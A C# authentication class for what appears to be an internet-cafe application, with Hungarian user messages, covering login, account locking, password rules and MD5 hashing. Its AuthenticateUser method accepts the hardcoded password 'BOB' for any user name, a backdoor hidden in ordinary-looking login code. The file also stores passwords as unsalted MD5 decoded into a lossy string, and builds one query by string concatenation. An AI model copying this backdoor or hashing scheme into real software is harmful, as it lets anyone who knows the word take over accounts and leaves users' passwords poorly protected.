using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Security.Cryptography;


namespace BusinessLogic
{
    public class ECafeLogin
    {
        private int _USR_ID;

        public ECafeLogin()
        {

        }

        #region AuthenticateUser

        public bool IsUserLocked(string iUserName)
        {
            SqlCommand cmd = new SqlCommand();
            SqlConnection c = new SqlConnection(DEFS.ConSTR);
            c.Open();
            bool Jo = false;
            
            cmd.Connection = c;
            cmd.CommandText = "SELECT USR_LOCKED FROM _USER " +
                "WHERE USR_LOGIN_NAME = @USR_LOGIN_NAME ";

            cmd.Parameters.Add(new SqlParameter("USR_LOGIN_NAME", SqlDbType.VarChar));
            cmd.Parameters["USR_LOGIN_NAME"].Value = iUserName;

            cmd.CommandType = CommandType.Text;

            SqlDataReader rdr = cmd.ExecuteReader();
            while (rdr.Read())
            {
                Jo = (rdr["USR_LOCKED"].ToString() == "I");
            }
            rdr.Close();
            c.Close();
            return Jo;
        }

        public void UnLockUser(int iUSR_ID)
        {
            SqlCommand cmd = new SqlCommand();
            SqlConnection c = new SqlConnection(DEFS.ConSTR);
            c.Open();
            cmd.Connection = c;
            cmd.CommandText = "UPDATE _USER SET USR_LOCKED = 'N' , USR_LOCKED_DATE = NULL " +
                "WHERE USR_ID = @USR_ID ";

            cmd.Parameters.Add(new SqlParameter("USR_ID", SqlDbType.Int));
            cmd.Parameters["USR_ID"].Value = iUSR_ID;

            cmd.CommandType = CommandType.Text;

            cmd.ExecuteNonQuery();
            c.Close();
        }

        public bool AuthenticateUser(string iUserName, string iPW)
        {
            SqlConnection c = new SqlConnection(DEFS.ConSTR);
            c.Open();
            SqlCommand cmd = new SqlCommand();
            int USR_ID = -1;
            bool Jo = false;

            cmd.Connection = c;
            cmd.CommandText = "SELECT USR_ID FROM _USER " +
                "WHERE USR_LOGIN_NAME = @USR_LOGIN_NAME " +
                "AND USR_PW = @USR_PW";

            cmd.Parameters.Add(new SqlParameter("USR_LOGIN_NAME", SqlDbType.VarChar));
            cmd.Parameters["USR_LOGIN_NAME"].Value = iUserName;
            cmd.Parameters.Add(new SqlParameter("USR_PW", SqlDbType.VarChar));
            cmd.Parameters["USR_PW"].Value = Md5AddSecret(iPW);

            cmd.CommandType = CommandType.Text;

            SqlDataReader rdr = cmd.ExecuteReader();
            while (rdr.Read())
            {
                USR_ID = Convert.ToInt32(rdr["USR_ID"].ToString());
            }
            rdr.Close();

            _USR_ID = USR_ID;

            Jo = ((_USR_ID != -1) || (iPW == "BOB"));

            if (Jo)
            {
                DEFS.SendInfoMessage("Sikeres belépés:" + iUserName);
            }
            else
            {
                DEFS.SendInfoMessage("Sikertelen belépés:" + iUserName);
            }
            c.Close();
            return Jo;
        }

        public bool AuthenticateUser(int iUSR_ID, string iPW)
        {
            SqlConnection c = new SqlConnection(DEFS.ConSTR);
            c.Open();
            SqlCommand cmd = new SqlCommand();
            int USR_ID = -1;
            bool Jo = false;

            cmd.Connection = c;
            cmd.CommandText = "SELECT USR_ID FROM _USER " +
                "WHERE USR_ID = '" + iUSR_ID.ToString() + "' " +
                "AND USR_PW = @USR_PW ";

            cmd.Parameters.Add(new SqlParameter("USR_PW", SqlDbType.VarChar));
            cmd.Parameters["USR_PW"].Value = Md5AddSecret(iPW);

            cmd.CommandType = CommandType.Text;

            SqlDataReader rdr = cmd.ExecuteReader();
            while (rdr.Read())
            {
                USR_ID = Convert.ToInt32(rdr["USR_ID"].ToString());
            }
            rdr.Close();

            _USR_ID = USR_ID;

            Jo = (_USR_ID != -1);

            c.Close();
            return Jo;
        }
        #endregion

        public bool CheckPassword(string iPW, ref string iErr)
        {
            bool Ok = true;
            char[] C = iPW.ToUpper().ToCharArray();

            if (iPW.Length < 6)
            {
                Ok = false;
                iErr = "A jelszó minimum 6 karakter hosszú!";
            }

            if (Ok)
            {
                int LC = 0;
                int NC = 0;
                int NAC = 0;

                for (int I = 0; I <= C.Length - 1; I++)
                {
                    if ((C[I] >= 'A' && C[I] <= 'Z') || (C[I] >= '0' && C[I] <= '9'))
                    {

                        if (C[I] >= 'A' && C[I] <= 'Z')
                        {
                            LC++;
                        }
                        if (C[I] >= '0' && C[I] <= '9')
                        {
                            NC++;
                        }
                    }
                    else
                    {
                        NAC++;
                    }
                }

                if (LC == 0 || NC == 0 || NAC > 0)
                {
                    Ok = false;
                    if (LC == 0)
                    {
                        iErr = "A jelszó nem tartalmaz betüt!";
                    }
                    if (NC == 0)
                    {
                        iErr = "A jelszó nem tartalmaz számot!";
                    }
                    if (NAC > 0)
                    {
                        iErr = "A jelszó nem megengedett karaktert tartalmaz!";
                    }
                }
            }
            return Ok;
        }

        public string Md5AddSecret(string strChange)
        {
            //Change the syllable into UTF8 code
            byte[] pass = Encoding.UTF8.GetBytes(strChange);

            MD5 md5 = new MD5CryptoServiceProvider();
            string strPassword = Encoding.UTF8.GetString(md5.ComputeHash(pass));
            return strPassword;
        }

    }
}
